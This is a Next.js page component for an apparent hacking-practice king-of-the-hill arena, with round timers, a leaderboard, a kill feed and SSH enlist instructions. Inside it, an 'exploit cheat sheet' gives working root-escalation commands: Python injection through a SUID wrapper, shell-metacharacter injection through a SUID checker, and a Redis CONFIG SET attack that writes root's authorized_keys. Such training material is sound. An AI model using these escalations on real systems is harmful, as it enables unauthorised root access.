import Link from "next/link";
import { and, desc, eq } from "drizzle-orm";
import { getCurrentSession } from "@/lib/auth/session";
import { db } from "@/lib/db/client";
import { kothEvents, kothRounds, users } from "@/lib/db/schema";
import {
  findKeyForUser,
  findRoundSlotForUser,
} from "@/lib/koth/keys";
import { topNForRound } from "@/lib/koth/scoring";
import { currentPricesForRound } from "@/lib/koth/paths";
import { getLifetimeStatsForUsers } from "@/lib/koth/honors";
import { titleFromRoundWins } from "@/lib/koth/titles";
import { secondsUntilNextSeed, todayUtcString } from "@/lib/koth/daily";
import { joinKothRound, submitKothKey } from "./actions";
import { RealtimeRefresh } from "./RealtimeRefresh";

export const dynamic = "force-dynamic";
export const revalidate = 0;

const ROUND_DURATION_SECONDS = 30 * 60;
const ARENA_HOST = "204.168.229.209";
const ARENA_PORT = 2300;
const ESCALATION_THRESHOLD_SECONDS = 300;

// Daily challenge — days since project epoch. Mirrors /battles/koth/daily.
const DAILY_EPOCH = new Date("2026-05-01T00:00:00Z").getTime();
function dailyChallengeNumber(day: string): number {
  const d = new Date(day + "T00:00:00Z").getTime();
  return Math.max(1, Math.floor((d - DAILY_EPOCH) / 86400_000) + 1);
}

function fmtHHMMSS(sec: number): string {
  const h = Math.floor(sec / 3600);
  const m = Math.floor((sec % 3600) / 60);
  const s = sec % 60;
  return `${h.toString().padStart(2, "0")}:${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
}

type EventMeta = { value_snapshot?: number };
function snapOf(raw: unknown): number | null {
  if (!raw || typeof raw !== "object") return null;
  const v = (raw as EventMeta).value_snapshot;
  return typeof v === "number" ? v : null;
}

function fmtDuration(seconds: number): string {
  const s = Math.max(0, seconds);
  const m = Math.floor(s / 60);
  const r = s % 60;
  return `${m}:${r.toString().padStart(2, "0")}`;
}

async function loadState() {
  const [round] = await db
    .select({
      id: kothRounds.id,
      startedAt: kothRounds.startedAt,
      engagedAt: kothRounds.engagedAt,
    })
    .from(kothRounds)
    .where(eq(kothRounds.status, "active"))
    .orderBy(desc(kothRounds.startedAt))
    .limit(1);

  if (!round) {
    return {
      round: null,
      king: null,
      top5: [],
      feed: [],
      paths: [] as Awaited<ReturnType<typeof currentPricesForRound>>,
      escalationEtaSec: null as number | null,
    };
  }

  // engaged_at IS NULL = arena standing by. Clock doesn't tick until
  // the first crown_taken.
  const engaged = round.engagedAt !== null;
  const ageSeconds = engaged
    ? Math.max(
        0,
        Math.floor((Date.now() - round.engagedAt!.getTime()) / 1000),
      )
    : 0;

  // Scope king detection to the current round only — see
  // api/koth/state/route.ts for the same fix. A global lookup leaks
  // the last king from a closed round into the next standing-by round.
  const [kingEvent] = await db
    .select({
      occurredAt: kothEvents.occurredAt,
      exploitPath: kothEvents.exploitPath,
      username: users.username,
    })
    .from(kothEvents)
    .leftJoin(users, eq(users.id, kothEvents.actorUserId))
    .where(
      and(
        eq(kothEvents.kind, "crown_taken"),
        eq(kothEvents.roundId, round.id),
      ),
    )
    .orderBy(desc(kothEvents.occurredAt))
    .limit(1);

  const king =
    kingEvent && kingEvent.username
      ? {
          username: kingEvent.username,
          since: kingEvent.occurredAt,
          holdSeconds: Math.max(
            0,
            Math.floor((Date.now() - kingEvent.occurredAt.getTime()) / 1000),
          ),
          exploitPath: kingEvent.exploitPath,
        }
      : null;

  const top5 = await topNForRound(round.id, 5);

  const feedRows = await db
    .select({
      occurredAt: kothEvents.occurredAt,
      kind: kothEvents.kind,
      exploitPath: kothEvents.exploitPath,
      actorUsername: users.username,
      rawMeta: kothEvents.rawMeta,
    })
    .from(kothEvents)
    .leftJoin(users, eq(users.id, kothEvents.actorUserId))
    .where(eq(kothEvents.roundId, round.id))
    .orderBy(desc(kothEvents.occurredAt))
    .limit(10);

  const feed = feedRows.map((r) => {
    const ts = r.occurredAt.toISOString().slice(11, 19);
    const actor = r.actorUsername ?? "unknown";
    const snap = snapOf(r.rawMeta);
    const v = snap != null ? ` (+${snap} pt)` : "";
    const path = r.exploitPath ? ` via ${r.exploitPath}${v}` : "";
    let line: string;
    switch (r.kind) {
      case "crown_taken":
        line = `${actor} took the crown${path}`;
        break;
      case "patched":
        line = `${actor} patched ${r.exploitPath ?? "an exploit"}`;
        break;
      case "path_patched_attributed":
        line = `${actor} closed ${r.exploitPath} (path-attributed +5)`;
        break;
      case "escalated":
        line = `escalation: new path open${path}`;
        break;
      case "path_activated":
        line = `new path opened: ${r.exploitPath ?? "?"}`;
        break;
      case "tutorial":
        line = `${actor} cleared the tutorial`;
        break;
      default:
        line = `${actor} ${r.kind}${path}`;
    }
    return { ts, line, kind: r.kind };
  });

  const paths = await currentPricesForRound(round.id);
  const escalationEtaSec =
    king && king.holdSeconds < ESCALATION_THRESHOLD_SECONDS
      ? ESCALATION_THRESHOLD_SECONDS - king.holdSeconds
      : null;

  return {
    round: {
      id: round.id,
      engaged,
      ageSeconds,
      remainingSeconds: engaged
        ? Math.max(0, ROUND_DURATION_SECONDS - ageSeconds)
        : ROUND_DURATION_SECONDS,
    },
    king,
    top5,
    feed,
    paths,
    escalationEtaSec,
  };
}

export const metadata = {
  title: "Crown Wars — Predator Arena · BreachLab",
};

export default async function KothPage({
  searchParams,
}: {
  searchParams: Promise<{ error?: string; registered?: string }>;
}) {
  const { user } = await getCurrentSession();
  const params = await searchParams;
  const state = await loadState();

  const myKey = user ? await findKeyForUser(user.id) : null;
  // The slot is now per-round. A returning operator whose previous
  // round closed has a key but no slot in the current round — they
  // need to click "Join this round" to claim one.
  const mySlot =
    user && state.round
      ? await findRoundSlotForUser(user.id, state.round.id)
      : null;

  // Lifetime totals for the operators on the leaderboard so the row
  // can flex "× 12 round wins · 47 crowns" next to a current-round
  // point count. One batched query for all 5 visible names.
  const lifetimeStats = await getLifetimeStatsForUsers(
    state.top5.map((r) => r.userId),
  );

  const pendingEscalation = state.paths.filter(
    (p) => p.kind === "escalation" && !p.activated && p.pendingUntil !== null,
  );

  const todayDay = todayUtcString();
  const todayChallenge = dailyChallengeNumber(todayDay);
  const secsToNextDaily = secondsUntilNextSeed();

  return (
    <article className="space-y-5 max-w-3xl" data-testid="koth-page">
      <RealtimeRefresh intervalMs={3000} />

      {/* Hero */}
      <header className="space-y-2">
        <div className="text-[10px] text-amber/80 tracking-[0.4em] uppercase font-mono">
          ▸ predator arena
        </div>
        <h1 className="text-amber text-3xl sm:text-4xl phosphor wordmark font-bold tracking-[0.08em]">
          <span className="glitch" data-text="CROWN WARS">
            CROWN WARS
          </span>
        </h1>
      </header>

      {/* Quick-nav strip — Daily, Replays, Race, Rules in one compact
          row. Replaces the old help-bar + 3-card hero. All CTAs above
          the fold without dominating the page. Daily chip keeps a live
          countdown to the next UTC reset. */}
      <nav className="flex flex-wrap items-center gap-x-4 gap-y-2 text-[11px] font-mono border-b border-amber/20 pb-2">
        <Link
          href="/battles/koth/daily"
          className="text-amber hover:text-amber/80 tracking-[0.18em] uppercase"
        >
          ▸ daily #{todayChallenge}
          <span className="text-muted/80 normal-case tabular-nums ml-1 tracking-normal">
            · {fmtHHMMSS(secsToNextDaily)}
          </span>
        </Link>
        <Link
          href="/battles/koth/replays"
          className="text-amber/80 hover:text-amber tracking-[0.18em] uppercase"
        >
          ▸ replays
        </Link>
        <Link
          href="/battles/koth/replays?kind=crown_moment"
          className="text-amber/80 hover:text-amber tracking-[0.18em] uppercase"
        >
          ▸ ghost-race
        </Link>
        <Link
          href="/battles/koth/rules"
          className="ml-auto text-muted hover:text-amber tracking-[0.18em] uppercase"
        >
          rules →
        </Link>
      </nav>

      {/* Solo modes — hero-level CTAs for Daily + Replays + Race.
          Above the round console so they read as first-class entries,
          not buried in the footer. Three equal cards, each fully
          clickable. */}
      <section className="grid grid-cols-1 sm:grid-cols-3 gap-3">
        <Link
          href="/battles/koth/daily"
          className="group block border border-amber/30 bg-amber/[0.03] hover:bg-amber/[0.08] hover:border-amber/60 transition-colors px-3 py-3 font-mono"
        >
          <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase">
            ▸ daily · solo
          </div>
          <div className="text-text text-[15px] mt-1.5 tracking-wide">
            #{todayChallenge} · one primitive
          </div>
          <div className="text-muted text-[11px] mt-1 tabular-nums">
            resets in {fmtHHMMSS(secsToNextDaily)}
          </div>
          <div className="text-amber/70 group-hover:text-amber text-[11px] mt-2 tracking-[0.18em] uppercase">
            crown today →
          </div>
        </Link>

        <Link
          href="/battles/koth/replays"
          className="group block border border-amber/30 bg-amber/[0.03] hover:bg-amber/[0.08] hover:border-amber/60 transition-colors px-3 py-3 font-mono"
        >
          <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase">
            ▸ replays · library
          </div>
          <div className="text-text text-[15px] mt-1.5 tracking-wide">
            every crown · auto-clipped
          </div>
          <div className="text-muted text-[11px] mt-1">
            asciinema · raw .cast · deep links
          </div>
          <div className="text-amber/70 group-hover:text-amber text-[11px] mt-2 tracking-[0.18em] uppercase">
            watch the kills →
          </div>
        </Link>

        <Link
          href="/battles/koth/replays?kind=crown_moment"
          className="group block border border-amber/30 bg-amber/[0.03] hover:bg-amber/[0.08] hover:border-amber/60 transition-colors px-3 py-3 font-mono"
        >
          <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase">
            ▸ ghost · race
          </div>
          <div className="text-text text-[15px] mt-1.5 tracking-wide">
            beat a recorded crown
          </div>
          <div className="text-muted text-[11px] mt-1">
            solo · per-replay leaderboard
          </div>
          <div className="text-amber/70 group-hover:text-amber text-[11px] mt-2 tracking-[0.18em] uppercase">
            pick a ghost →
          </div>
        </Link>
      </section>

      {/* ─── Combined Arena Console ───────────────────────────────
          Round status strip (top) + enlist / SSH / sign-in (body).
          Border switches to green when the viewer is enlisted, giving
          a clear "you're in" identity signal across the whole console. */}
      <section
        className={`border ${
          mySlot
            ? "border-green/40 bg-green/[0.03]"
            : "border-amber/40 bg-amber/[0.03]"
        }`}
      >
        {/* Round status strip */}
        <div
          className={`border-b ${
            mySlot ? "border-green/20" : "border-amber/20"
          } px-4 py-2.5 flex items-center gap-3 flex-wrap text-[11px] font-mono tabular-nums`}
        >
          {state.round ? (
            state.round.engaged ? (
            <>
              <span className="flex items-center gap-2">
                <span className="pulse-dot text-green">●</span>
                <span className="text-muted uppercase tracking-widest">
                  round live
                </span>
              </span>
              <span className="text-amber">
                age {fmtDuration(state.round.ageSeconds)} / 30:00
              </span>
              <span className="text-muted">·</span>
              <span className="text-text">
                resets in {fmtDuration(state.round.remainingSeconds)}
              </span>
              <span className="text-muted">·</span>
              {state.king ? (
                <span className="text-green">
                  king: {state.king.username} ·{" "}
                  {fmtDuration(state.king.holdSeconds)}
                </span>
              ) : (
                <span className="text-muted">crown vacant</span>
              )}
              {state.escalationEtaSec !== null && state.king && (
                <>
                  <span className="text-muted">·</span>
                  <span className="text-red-400">
                    escalation in {fmtDuration(state.escalationEtaSec)}
                  </span>
                </>
              )}
              {pendingEscalation.length > 0 && (
                <>
                  <span className="text-muted">·</span>
                  <span className="text-red-400 animate-pulse">
                    ⚠ incoming: {pendingEscalation.map((p) => p.slug).join(", ")}
                  </span>
                </>
              )}
            </>
            ) : (
              <>
                <span className="flex items-center gap-2">
                  <span className="text-amber/70">○</span>
                  <span className="text-muted uppercase tracking-widest">
                    arena standing by
                  </span>
                </span>
                <span className="text-muted">·</span>
                <span className="text-text">
                  clock starts on the first crown grab
                </span>
                <span className="text-muted">·</span>
                <span className="text-amber/80">round: 30:00 fresh</span>
              </>
            )
          ) : (
            <span className="text-muted">
              arena resetting · no active round
            </span>
          )}
        </div>

        {/* Body — three states: unsigned / enlisted / sign-in-but-no-key */}
        {!user ? (
          <div className="px-4 py-3 space-y-2">
            <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase font-mono">
              ▸ enlist
            </div>
            <p className="text-[13px] text-text">
              Sign in to register your SSH key and claim a slot in the arena.
            </p>
            <Link
              href="/login?next=/battles/koth"
              className="btn-bracket text-amber text-[12px] font-mono"
            >
              Sign in to enlist
            </Link>
          </div>
        ) : myKey && mySlot ? (
          <div className="px-4 py-3 space-y-2">
            <div className="flex items-center justify-between gap-3 flex-wrap">
              <div className="flex items-center gap-2 text-[10px] tracking-[0.3em] uppercase font-mono">
                <span className="text-green/80">
                  ▸ enlisted · slot koth{mySlot.slot}
                </span>
                {myKey.tutorialCompletedAt ? (
                  <span className="border border-amber/60 text-amber bg-amber/5 px-1 py-0">
                    veteran
                  </span>
                ) : (
                  <span className="border border-muted/60 text-muted bg-bg px-1 py-0">
                    rookie · first crown unlocks
                  </span>
                )}
              </div>
              <span className="text-[10px] text-muted font-mono tabular-nums">
                {myKey.fingerprint.slice(0, 22)}…
              </span>
            </div>
            <pre className="text-[12px] leading-relaxed text-text overflow-x-auto">
{`ssh -i ~/.ssh/your_key -p ${ARENA_PORT} koth${mySlot.slot}@${ARENA_HOST}`}
            </pre>
            <p className="text-[10px] text-muted/80 leading-snug -mt-1">
              Your key syncs to the arena every ~60s. If the first
              <code className="mx-1">ssh</code>
              hits <em>permission denied</em>, give it a minute and retry.
            </p>
            <p className="text-[11px] text-muted leading-snug">
              Once inside: get root via the SUID paths or Redis, then
              <code className="ml-1">
                crown-claim koth{mySlot.slot} &lt;exploit&gt;
              </code>{" "}
              to claim the throne.
            </p>

            {/* Exploit cheat sheet — collapsible, native <details>, no JS */}
            <details className="text-[12px] font-mono pt-1.5 border-t border-green/20 mt-2">
              <summary className="cursor-pointer text-amber hover:text-amber/80 select-none py-1 tracking-wider">
                ▸ exploit cheat sheet · open at your own risk
              </summary>
              <div className="space-y-3 pt-2 pb-1">
                <div className="space-y-1">
                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
                    suid-python-wrapper · argv code injection
                  </div>
                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
{`/usr/local/bin/phantom-python3 -c \\
  'import os; os.system("crown-claim koth${mySlot.slot} suid-python-wrapper")'`}
                  </pre>
                </div>
                <div className="space-y-1">
                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
                    suid-shell-injection · shell metachar through SUID wrapper
                  </div>
                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
{`/usr/local/bin/system-checker \\
  '127.0.0.1; crown-claim koth${mySlot.slot} suid-shell-injection'`}
                  </pre>
                </div>
                <div className="space-y-1">
                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
                    redis-config-set-dir · write authorized_keys via redis-cli
                  </div>
                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto whitespace-pre">
{`ssh-keygen -t ed25519 -f /tmp/k -N ''
KEY=$(cat /tmp/k.pub)
redis-cli <<EOF
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET x "\\n\\n$KEY\\n\\n"
SAVE
EOF
ssh -i /tmp/k -o StrictHostKeyChecking=no root@localhost \\
  "crown-claim koth${mySlot.slot} redis-config-set-dir"`}
                  </pre>
                </div>
                <p className="text-[10px] text-muted leading-snug pt-1">
                  These work today. The box mutates against playbooks —
                  defenders close paths after they&apos;re used. Real opsec
                  means reading <code className="mx-1">/var/log/auth.log</code>
                  and adapting in real time, not copy-paste forever.
                </p>
              </div>
            </details>
          </div>
        ) : myKey ? (
          // Operator has a registered key but no slot in the current
          // round — happens after a round close. Single-click claim.
          <div className="px-4 py-3 space-y-3">
            <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase font-mono">
              ▸ welcome back — claim your slot for this round
            </div>
            {params.error && (
              <div className="text-[12px] text-red-400 font-mono border border-red-400/40 bg-red-400/5 px-2 py-1">
                ✗ {params.error}
              </div>
            )}
            <p className="text-[12px] text-muted leading-snug">
              Slots are now per-round (max 10). Your SSH key is on
              file — one click and you&apos;re in. Slots release on
              every round close so new operators always have a path
              in.
            </p>
            <form action={joinKothRound}>
              <button
                type="submit"
                className="btn-bracket text-amber text-[12px] font-mono"
              >
                Join this Round
              </button>
            </form>
          </div>
        ) : (
          <div className="px-4 py-3 space-y-3">
            <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase font-mono">
              ▸ enlist — register your SSH key
            </div>
            {params.error && (
              <div className="text-[12px] text-red-400 font-mono border border-red-400/40 bg-red-400/5 px-2 py-1">
                ✗ {params.error}
              </div>
            )}
            {params.registered === "1" && (
              <div className="text-[12px] text-green font-mono border border-green/40 bg-green/5 px-2 py-1">
                ✓ key registered — slot assigned above
              </div>
            )}
            <p className="text-[12px] text-muted leading-snug">
              Slots are per-round (max 10) — they release on every
              round close so the arena stays open to new operators.
              Register once, claim a slot whenever you want to play.
            </p>
            <form action={submitKothKey} className="space-y-2">
              <label
                htmlFor="pubkey"
                className="block text-[11px] text-muted uppercase tracking-widest font-mono"
              >
                public key (one line — ssh-ed25519 preferred)
              </label>
              <textarea
                id="pubkey"
                name="pubkey"
                rows={3}
                required
                placeholder="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... your@host"
                className="w-full bg-bg border border-amber/30 px-3 py-2 text-[12px] font-mono text-text resize-y focus:outline-none focus:border-amber"
              />
              <div className="flex items-center justify-between gap-3 flex-wrap">
                <span className="text-[10px] text-muted">
                  generate with <code>ssh-keygen -t ed25519</code> · paste the
                  .pub
                </span>
                <button
                  type="submit"
                  className="btn-bracket text-amber text-[12px] font-mono"
                >
                  Enlist in Arena
                </button>
              </div>
            </form>
          </div>
        )}
      </section>

      {/* Top-5 leaderboard */}
      <section className="border border-border/60 px-4 py-3 space-y-2">
        <h2 className="text-amber text-sm font-mono tracking-[0.18em] uppercase">
          ▸ top operators (this round)
        </h2>
        {state.top5.length === 0 ? (
          <p className="text-[12px] text-muted font-mono">
            no scoring yet — first crown grab will appear here
          </p>
        ) : (
          <ol className="space-y-1 text-[12px] font-mono tabular-nums">
            {state.top5.map((row, i) => {
              const life = lifetimeStats.get(row.userId);
              const title = life ? titleFromRoundWins(life.roundWins) : null;
              return (
                <li key={row.userId} className="flex items-center gap-3">
                  <span className="text-amber w-4">{i + 1}.</span>
                  <span className="text-text flex-1 truncate flex items-baseline gap-1.5">
                    {title && (
                      <span
                        className={`text-[9px] tracking-wider ${title.color}`}
                        title={`${life?.roundWins ?? 0} round wins · ${life?.crowns ?? 0} crowns · ${life?.dethrones ?? 0} dethrones`}
                      >
                        {title.glyph} {title.label}
                      </span>
                    )}
                    {row.username}
                    {life && life.roundWins > 0 && (
                      <span
                        className="text-[9px] text-muted/80 tracking-wider"
                        title="lifetime round wins"
                      >
                        ×{life.roundWins}
                      </span>
                    )}
                  </span>
                  <span className="text-amber w-12 text-right">{row.points} pt</span>
                  <span className="text-muted text-[10px] w-20 text-right">
                    {row.dethrones}d / {row.patches}p
                  </span>
                </li>
              );
            })}
          </ol>
        )}
      </section>

      {/* Kill-feed */}
      <section className="border border-border/60 px-4 py-3 space-y-2">
        <h2 className="text-amber text-sm font-mono tracking-[0.18em] uppercase">
          ▸ kill feed
        </h2>
        {state.feed.length === 0 ? (
          <p className="text-[12px] text-muted font-mono">
            waiting for the first claim…
          </p>
        ) : (
          <ul className="space-y-1 text-[12px] font-mono leading-relaxed">
            {state.feed.map((ev, i) => (
              <li key={i} className="flex gap-3">
                <span className="text-amber/70 tabular-nums w-16">{ev.ts}</span>
                <span className="text-text flex-1">{ev.line}</span>
              </li>
            ))}
          </ul>
        )}
      </section>

      <footer className="pt-3 border-t border-border/40 flex items-center justify-between text-xs text-muted font-mono gap-3 flex-wrap">
        <Link href="/battles" className="hover:text-amber tracking-[0.18em] uppercase">
          ← battles
        </Link>
        <div className="flex items-center gap-3">
          <Link href="/battles/koth/daily" className="hover:text-amber tracking-[0.18em] uppercase">
            daily
          </Link>
          <Link href="/battles/koth/replays" className="hover:text-amber tracking-[0.18em] uppercase">
            replays
          </Link>
          <Link href="/battles/koth/champions" className="hover:text-amber tracking-[0.18em] uppercase">
            champions
          </Link>
          <Link href="/battles/koth/history" className="hover:text-amber tracking-[0.18em] uppercase">
            history
          </Link>
        </div>
        <span className="tracking-[0.18em] uppercase">predator</span>
      </footer>
    </article>
  );
}
